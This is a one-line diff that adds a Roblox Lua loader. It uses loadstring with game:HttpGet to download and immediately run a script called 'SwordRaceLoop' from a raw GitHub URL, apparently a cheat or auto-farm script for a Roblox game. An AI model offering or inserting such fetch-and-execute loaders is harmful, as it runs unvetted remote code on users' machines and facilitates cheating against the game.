@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AverageRobloxUser1/SwordRaceLoop/main/SwordRaceLoop1",true))();
